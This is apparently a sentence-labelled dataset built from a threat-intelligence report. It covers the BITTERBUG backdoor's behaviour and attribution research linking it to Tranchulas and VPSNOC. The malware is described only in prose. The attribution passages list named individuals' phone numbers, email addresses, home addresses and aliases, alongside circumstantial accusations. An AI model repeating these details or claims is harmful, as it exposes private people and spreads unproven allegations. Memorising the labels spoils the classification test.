It was this chain of events that served as a catalyst for extra scrutiny of the activity and collaboration between the ThreatConnect and FireEye Labs teams to share information .	0
While we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity , we can confidently point to many characteristics of a Pakistan-based cyber exploitation effort that is probably directed against Indian targets or those who are involved in India-Pakistan issues .	0
Many of the notable characteristics of the BITTERBUG activity suggest that this is indeed part of a Pakistan-based cyber exploitation effort that has apparently attempted to obfuscate its malware characteristics and origins ( behind U.S. infrastructure ) , before and after public disclosure in August 2013 .	1
On the surface , BITTERBUG serves as an example of how threat actors mask their operations across social , cultural and geographic boundaries .	0
More importantly , it demonstrates the value of threat intelligence sharing and industry collaboration .	0
As one organization begins to pull at a thread of evidence and share their findings with another , a larger understanding and shared perspective is revealed .	0
It is through this process that a shared awareness emerges into a larger , more comprehensive story that explains what we are seeing and why - ultimately it is this story that better serves us all .	0
BITTERBUG is a backdoor executable capable of uploading and downloading files , listing running processes , generating file listings , and automatically transferring selected files to its command and control ( C2 ) server .	1
BITTERBUG appears to be virtual machine aware and may not execute on a VMWare or VirtualBox VM .	1
We have observed BITTERBUG installed by a self-extracting RAR archive disguised as a screensaver .	1
Upon execution , the self-extracting RAR archive may extract configuration files , dependency DLLs , and the BITTERBUG executable .	1
The timeline below is of BITTERBUG activity from May 2013 through March 2014 .	0
Upon execution the self-extracting RAR may install < BITTERBUG > .exe and the following DLLs : The self-extracting RAR may install the following benign configuration files : BITTERBUG first may execute the following Windows Management Instrumentation ( WMI ) command to detect the presence of a virtual machine ( VM ) : BITTERBUG then may open recovery.txt and check for the presence of strings VBox or VMware .	1
The backdoor then may enter an infinite sleep loop if recovery.txt contains either one of the aforementioned strings ( Example in Figure 13 ) .	1
Next BITTERBUG typically will beacon to the C2 server by sending the computer name and username of the compromised system .	1
An example beacon request is shown in Figure 14 .	0
BITTERBUG then may perform an HTTP GET request for the following URI : If the C2 server responds with a filename , the filename received is deleted from % APPDATA % \Microsoft < FILENAMEFROM C2 > .	1
The purpose of this command might be to delete older versions of BITTERBUG , although we have not observed this command occurring in the wild .	1
BITTERBUG then may attempt to download the files listed in Table 1 .	1
The purpose of the first three files is unknown .	0
The final two files are downloaded to the user 's Startup directory and executed at startup in order to maintain persistence .	1
Next , BITTERBUG may scan through each drive letter and search recursively for files with the following file extensions : BITTERBUG then typically creates a file list containing all documents ( excluding those whose filename contains MediaUtils ) to the following locations : BITTERBUG may also write a list of all running processes to : Finally , BITTERBUG typically uploads the running process list , document file list , and all documents to the following URI : BITTERBUG may be extracted along with the following embedded files : The malware may create the following files : • The malware typically communicates on TCP port 80 : • The malware may perform HTTP requests for the following URIs : We observed other interesting operational security-oriented challenges in the post-blog post samples .	1
In one case , an actor appeared to manually null out the '' Cert-India '' user directory in one of the file paths ( see figures 15 and 16 below ) contained in two binaries ( support components ) .	0
These files shared the same import hash ( 4e96e86db5a8a025b996aefdc218ff74 ) and were virtually the same files minus modification to a few bytes in the second sample .	0
As these samples point to , we also observed use of the C++ Boost libraries , which introduced a new file path to monitor for operational security purposes .	0
We observed at least one case in which files mixed old and new file paths , as seen in the figures 17 and 18 below .	0
In both cases , it is possible that the actors intentionally did this in an attempt to mislead further research efforts into post-blog samples or cast suspicion on '' Cert-India '' as a more-revealing element .	0
For example , analysis of files deployed alongside the nulled-out '' Cert-India '' sample mentioned above revealed a lack of concern over the same string .	0
Alternatively , these inconsistencies could also indicate sloppy tradecraft and/or teamwork .	0
BITTERBUG Hashes BITTERBUG and Support Component Debug Strings ( in order of first use ) BITTERBUG Import Hashes HTTP Requests BITTERBUG Domain & IPs The Kansas-City-based hosting provider sent an introductory email message on July 24th , 2013 at 1500 CDT and would be received by TCIRT at 1400 EDT and VPSNOC on Thursday July 25th , 2013 at 1200 PKT .	0
Analysis of the VPSNOC email header indicated that the message was sent on Thursday 25 July at 02:28:41 +0500 GMT , which is consistent with Pakistan 's time zone .	0
Of note , the email message was sent with an X-Originating IP Address of 184.75.214.10 corresponding to a Private Internet Access Canadian proxy .	0
VPSNOC 's use of this commercial proxy service likely demonstrates the intent to mask the apparent origin of the sender .	0
These two examples highlight that VPSNOC 's inbound and outbound email communications consistently utilized a +0500 Pakistani timezone .	0
Due to the apparent Pakistani nexus within the BITTERBUG malware and the Pakistan time zone consistently observed within the VPSNOC emails , the TCIRT applied additional scrutiny and research of the content within the Tranchulas '' Response ThreatConnect.docx '' to validate their claims .	0
In the following section we will examine the inconsistencies observed .	0
Within the response we observed the following inconsistencies : Our review of the '' ResponseThreatConnect.docx '' focused in on the email screenshot ( Figure 3 ) image1.png that Khan provided revealing that the date probably had been modified to appear as though they were the first to notify VPSNOC .	0
Within the official response , Zubair Khan indicated that Tranchulas was '' already aware of this incident ...	0
and contacted hosting company .	0
'' The official response included a screenshot depicting an email sent to VPSNOC from an unidentified ( redacted ) tranchulas.com email address that was sent on '' Tue , Jul 21 , 2013 at 11:36 PM '' with no evidence of the date in which it was received by or responded to by VPSNOC .	0
This message contained a notable misalignment between the date and day of the week .	0
July 21 , 2013 was a Sunday , not a Tuesday .	0
'' Tuesday '' would have pre-dated our official notification that occurred on Wednesday July 24 , 2013 , and could indicate that Tranchulas may have obtained insight into the original TCIRT notification through Pakistan- based contacts within VPSNOC .	0
The TCIRT subsequently responded to Mr. Khan 's official explanation with a follow-up inquiry , offering Khan an opportunity to explain the date inconsistency within the email screenshot .	0
Mr. Khan deferred our request to Mr. Hamza Qamar , a Penetration Testing Team Lead at Tranchulas , who later responded with a simple denial that the email message had not been altered apart from blurring the name of the original sender .	0
The email screenshot ( image1.png ) from within the Tranchulas response demonstrated awareness of information that we initially withheld and later released in our blog post : one malware variant that contained a debug string with '' umairaziz27 '' the same username as a Tranchulas employee .	0
The Tranchulas message to VPSNOC incorrectly claimed to identify malware on 199.91.173.43 that contained the '' company 's name and ...	0
employee 's name '' .	0
While it is possible that Tranchulas ' analysts discovered this variant independent of the blog post , it added to the inconsistent elements of the response and further suggested that the blog post may have inspired its communications with VPSNOC .	0
We note that we requested additional information such as the '' detailed analysis report '' within the exchange from Tranchulas but did not receive a response .	0
The Tranchulas response indicates that '' Tranchulas ' research team was already aware of this incident before publication of this report .	0
Our team contacted hosting company of server to seek an explanation .	0
'' Considering there are no public references to the identified infrastructure identifying VPSNOC as the '' hosting company '' .	0
The only way for Tranchulas to identify VPSNOC as the hosting company was to either have previous insider knowledge of the activity , or to have been privately introduced by the Kansas-City-based service provider to their '' client '' VPSNOC , of which was never mentioned or discussed when we initially exchanged with either the Kansas-City or Pakistan-based hosting providers .	0
Public registration of the 199.91.173.43 reveals the Kansas-City-based hosting provider as the official registrant and owner of the infrastructure .	0
The only way to know that VPSNOC was subleasing the infrastructure was to obtain this information directly from them .	0
There was no public reference which would have revealed VPSNOC as the entity which maintained root access to the 199.91.173.43 .	0
Had Tranchulas legitimately conducted an initial victim notification sometime in late July 2013 , they would have likely done so through the Kansas-City-based hosting provider and not VPSNOC .	0
On August 15 , 2013 , Hamza Qamar 's response to TCIRT 's follow up inquiry to the observed inconsistencies redirected TCIRT personnel to VPSNOC to obtain an explanation versus attempting to explain the observed day date inconsistency and document properties within the Tranchulas email .	0
The TCIRT 's suspicion mounted when presenting Tranchulas with the opportunity to set the record straight , that Tranchulas could not substantiate their claims , rather deferring the TCIRT inquiry to a third party ( VPSNOC ) .	0
Within the '' ResponseThreatConnect.docx '' the image '' image1.png '' contains an undated response from VPSNOC to the '' Tue , Jul 21 , 2013 '' Tranchulas notification .	0
The undated VPSNOC response that Tranchulas received is nearly identical to the response that TCIRT and the Kansas-City-based service provider obtained on July 24th .	0
Tranchulas does not include the date or time as to when they obtained a response from VPSNOC .	0
The TCIRT found it unusual that neither the Kansas-City-based service provider or VPSNOC personnel ever indicated either way that they knew about the activity or had been previously contacted by either party .	0
When considering all of the inconsistencies , order of events and studying , Gmail webmail layout , similarities of keywords , salutations and closings within the '' Tue , Jul 21 , 2013 '' Tranchulas notification and the respective VPSNOC response .	0
The TCIRT grew increasingly suspicious of the exchanges with VPSNOC and subsequent exchanges with Tranchulas personnel .	0
Analysis of metadata within two benign decoy documents that were originally used within July 2013 BITTERBUG operations , Report.docx and NaxalitesFundedbyPakistan.docx , both maintained the author properties of '' hp '' .	1
In reviewing the document metadata within the '' ResponseThreatConnect.docx '' that was sent from Mr. Zubair Khan on August 6 , 2013 , the TCIRT also identified that this document maintained the creator properties of '' hp .	0
'' ( Figure 10 ) While the author field of '' hp '' does n't conclusively prove a relationship , it contributes to a body of circumstantial evidence which matches the document properties of the official Tranchulas response to the document properties that were also found within decoy documents that were bundled with BITTERBUG implants .	0
According to the vpsnoc.com website '' In 2007 five VPS experts decided to invest in their very own private rack space in the heart of Kansas , the United States .	0
Their aim ? To bring service-oriented , quality managed and unmanaged VPS solutions to clients all over the world .	0
Just 1 year later , after beginning their enterprise on 3 servers they had filled 2 server racks with happy clients receiving quality U.S support .	0
Their company continued to build momentum .	0
'' Whois records for vpsnoc.com indicate that another individual registered the domain and listed Digital Linx Hosting as the registrant organization with a Kansas City-based address , telephone number 925-665-1427 , and administrative email address admin @ digitallinx .	0
org .	0
This is the same registrant record for the digitallinx.net domain .	0
The digitallinx.net/sitemap.xml and the corresponding Google cache for digitallinx.net/sitemap.xml indiciate that both digitallinx.net and digitallinx.com have shared the same sitemap.xml at the same time .	0
The digitallinx.net/Contact.html identified similar overlaps with data across the .org	0
, .net	0
, and .com	0
domains .	0
The domain digitallinx.com is registered to Perasona # 1 .	0
He uses email addresses naseer @ digitallinx.com and nbhatti @ gmail.com as the domain registrant email address , along with address 638-F Johar Town , Lahore Pakistan and telephone 966.548805579 .	0
The DigitalLinx ( digitallinx.com ) website states that it is '' a web hosting / Web Solutions & Processing Outsourcing Company based in Pakistan '' .	0
Open source research of the phone number 925-665-1427 indicates that it is also used within site content as a phone number for defiantmarketing.com .	0
This domain is registered by Persona # 2 who uses the aliases '' agnosticon '' and '' agnostic '' .	0
Persona # 2 lists VPSNOC as the registrant organization , and uses the registration email address of abunasar @ yahoo.com with an address of House 12 , Street 21 , F-8/1 Islamabad Federal 44000 .	0
The domain defiantmarketing.com domain has used ns1.abunasar.net and ns2.abunasar.net for name services .	0
Within a January 2009 posting to a Debian users forum , Persona # 2 sends an email from the abunasar @ yahoo.com with a reply-to as abunasar @ army.com .	0
Within the post , Persona # 2 responds to the question '' Who 's using Debian '' listing DigitalLinx , Kansas City MO and the link to digitallinx.com .	0
Also , the seemingly abandoned Twitter profile for Persona # 2 is only following the Twitter profile for @ VPSNOC .	0
In an April 2012 post to blackhatworld.com , a user with the alias '' agnosticon '' posted promotional codes for VPSNOC hosting services , engaging with customers , providing them feedback regarding VPS services and thanking them for positive reviews .	0
Within the posting the user '' agnosticon '' included an image which was an actual advertisement that was hosted at http : //vpsnoc .	0
com/order.png .	0
Within the posted image it states '' VPSNOC is a subdivision of Digital Linx Hosting .	0
We have been in business since 2008 '' .	0
The posting concludes with '' If you have any further questions/queries please contact us directly at : support @ vpsnoc.com '' Muhammad Naseer Bhatti 's LinkedIn profile indicates that he is currently the founder for Digital Linx LLC and vBilling ( vbilling.org ) as well as a consultant for a U.S. company .	0
Both Bhatti and Digital Linx are listed as the registrants for vbilling.org , v-billing .	0
com , vgriffins.com and my-server.co , which use P.O .	0
Box 295658 , Riyadh Saudi Arabia as the registration address .	0
This is also the address for two U.S. companies ' local operations .	0
Bhatti is also listed as the owner of the netblock 46.4.139.224/28 .	0
Both passive DNS sources as well as Robtex highlight this overlapping infrastructure .	0
From September 7 - 9 , 2011 , Tranchulas in cooperation with the Pakistan National University of Sciences and Technology ( NUST ) , offered a Certified Penetration Testing Profession ( CPTP ) Workshop ( Figure 17 ) .	0
During the workshop , basic penetration techniques and skills were presented .	0
It is likely that CPTP workshops and alignment with NUST have allowed Tranchulas the opportunity to recruit student interns .	0
Within the CPTP event registration contact information for Muhammad Naseer was listed next to a Tranchulas office number ( 051- 2871433 ) .	0
It is important to note that Muhammad Naseer Bhatti has been previously known to drop the family name '' Bhatti '' within online correspondence ( Figure 18 ) .	0
In a June 2012 episode of Engineering and Technology Magazine podcast a Mohammed Nasser , Penetration Tester at Tranchulas was interviewed .	0
A Mohammed Nasser may also be directly affiliated with Tranchulas .	0
This links Tranchulas to a Pakistani employee or consultant also named Muhammad Naseer .	0
It is unknown if this is the same Muhammad Naseer that is associated with VPSNOC 's parent company Digital Linx , the Pakistan-based service provider which hosted the original BITTERBUG malware .	0
Abunasar Khan also maintains the aliases '' agnosticon '' and '' agnostic '' in addition to the email addresses abunasar @ yahoo .	0
com and abunasar @ army.com .	0
He has been previously associatedwith VPSNOC & Digital Linx .	0
An April 2012 Whois registrant record for the domain zeusadnetwork.com includes the first and last name Khan along with the same ( 925 ) 665-1427 phone number seen within the Digial Linx Hosting domains .	0
Khan registered a variety of domains , many of which use his abunasar.net for name services and abunasar.yahoo.com within the Start of Authority ( SOA ) records .	0
For example a July 2014 record ( Figure 19 ) for defiantmarketing.com and an August 2013 record ( Figure 20 ) for ns2.vpsnoc.com both maintain these references .	0
Abunasar Khan registered abunasar.net and previously ( May 2007 ) and maintained whitehate.org , which have both been used to demonstrate an affinity for and alignment with AntiSec and Anonymous movements .	0
The abunasar.net website prominently displays ascii art of the term '' antisec '' with antisec related content '' Blend in .	0
Get trusted .	0
Trust nobody .	0
Own everybody .	0
Disclose nothing .	0
Destroy everything .	0
Take back the scene .	0
'' This is a shared affinity that is also reflected amongst with the culture of Tranchulas employees .	0
The pure.whitehate.org domain has also been previously associated with Khan , examples can be found within # phrack and # darknet IRC sessions .	0
Ironically , in February 2011 , Khan 's Rootkit.com user profile was compromised revealing his profile 's username , password hash , email ( abunasar @ army.com ) , and the registration IP address of 202.125.143.67 ( Islamabad , Pakistan ) .	0
During his registration , Khan specified the name '' anony mo us '' when registering the profile .	0
As of 16 August 2013 , a Pastebin post contained details of a customer database compromise for nowclothing.pk , which included Khan 's name , email abunasar @ army.com , and cell phone number 03215488881 .	0
Research of the 03215488881 cell phone number yields a user profile '' abunasark '' in an April 2009 posting .	0
Khan posts pictures of his blue Baleno and includes another phone number 03234764838 .	0
In a secondary profile user '' Ak '' uses the same cell phone number 03215488881 in a 2009 sales posting for a 2004 blue Baleno .	0
Khan 's affinity for Suzuki Baleno cars is made obvious in a May 2009 registration for clubaleno.co.uk that was registered by Khan at VPSNOC using the name services of ns1.abunasar.net and ns2.abunasar.net with a SOA record of abunasar.yahoo.com .	0
Later in a June 2009 posting , Khan using the alias '' agnostic '' attempts to sell the domain clubaleno.co.uk and uses his abunasar @ army.com email address as a point of contact .	0
Khan is also observed using the alias '' agnosticon '' and a Toyota Racing Development avitar within posts to blackhatworld.com and again within a 2011 post where he posts a cpanel error that also includes his '' abunasar '' username within system output .	0
The Google+ profile for Khan reveals established social network links to a Team Lead for Penetration Testing at Tranchulas and a Digital Linx employee Shoaib Riaz who also maintains a social network association with the Digital Linx founder Muhammad Nasser Bhatti .	0
The Tranchulas website states that they provide a range of security services and training to include penetration and offensive cyber initiative ( OCI ) , in which they '' help national level cyber security programs on strategies for managing offensive technical threats '' .	0
In a September 2011 YouTube user '' tranchulascert '' posted a video titled '' Tranchulas Cyber Ranges - P @ sha ICT Awards 2011 '' , where they awarded runner up .	0
Within the video , the cyber ranges were referenced as being developed for '' defense forces '' that were aimed to '' help them in developing offensive and defensive warfare skills '' and '' combating anti-state hackers '' .	0
Although Tranchulas brands itself as a multi-national company , their respective operating addresses within United Kingdom the United States and New Zealand are all associated with either virtual office spaces or address forwarding services .	0
The Tranchulas website lists its Pakistan address within the 2nd floor of the Evacuee Trust Complex on Sir Agha Khan Road F-5/1 Islamabad 44000 .	0
The Evacuee Trust Complex is also known as Software Technology Park 2 or STP2 and hosts a variety of other commercial and government offices .	0
The Tranchulas employee , Hamza Qamar , that handled the response to our inquiry has a public LinkedIn profile that states that he '' Engaged in system and enterprise level network and Web application security testing for clients ranging from large federal agencies , DoD , and commercial clients .	0
'' The profile does not specify if DoD is a reference to the U.S. Department of Defense or another country 's Ministry of Defense .	0
Interestingly , Qamar 's Google+ page showed one '' friend '' in his circle despite more than 40 followers , Abunasar Khan a VPSNOC employee .	0
It is likely that Tranchulas provides services to the Pakistani government .	0
The offensive cyber initiative services offered by Tranchulas is offered to '' national-level cyber security programs '' suggesting a commercial demand from '' national-level '' customers .	0
The stated purpose and intent of the Tranchulas '' Cyber Ranges '' P @ sha ICT 2011 awards video suggests the ranges were specifically developed in support of national interests for offensive and defensive purposes .	0
The domain registration by Zubair Khan using an official Pakistani government address with his zubair @ tranchulas.com email address indicates that Khan may have or currently maintains a physical address at a location where other Pakistani government officials reside .	0
Historic Whois registration records for the domains textcrypter.com , taggnation.com , bookadoconline.com and saadiakhan .	0
net lists Tranchulas CEO Zubair Khan ( zubair @ tranchulas.com ) as the registrant for the domains .	0
At the time of registration Khan used the address 15-B , Mehran Block of the Gulshan-e-Jinnah F-5/1 Islamabad Pakistan for the domains .	0
In an April 2008 Request for Proposals , the Pakistan Public Works Department issued a tender for the Constriction of Government Servant Quarters and Garages at Gulshan-e-Jinnah Complex F-5/1 Islamabad .	0
Later in May of 2010 within a Pakistani Senate question and answer session , the Gulshan-e-Jinnah Complex was cited under Federal Lodges / Hostels in Islamabad under the control of Pakistan Ministry for Housing and Works .	0
A December 2010 TheNews Pakistan ran a story that detailed the differential in rents between commoners within Islamabad and Pakistani government officers accommodated at Gulshan-e-Jinnah .	0
According to Google Maps it is approximately 650 meters ( 8 minute walk ) from the Gulshan-e-Jinnah Complex to the Tranchulas offices within the Evacuee Trust Complex .	0
Within a May 2013 interview Khan specified that he comes from a family with a strong military background .	0
He detailed his interest in '' the world of hacking '' grew during his teen years , referencing his father 's diplomatic assignment to the Philippines in 2003 .	0
Khan would go on to establish Tranchulas in February 2006 after an independent audit of Pakistani Governments National Database and Registration Authority ( NADRA ) .	0
Digital Appendix 1 contains additional research collateral collected when conducting Operation Arachnophobia research .	0
Digital Appendix 2 contains raw email communications .	0
These .eml	0
files include raw SMTP headers , content and attachments .	0
Digital Appendix 3 contains screenshots of web content used to conduct analysis .	0
Digital Appendix 4 contains visualization files that depict relationships and contain metadata associated with our Operation Arachnophobia research .	0
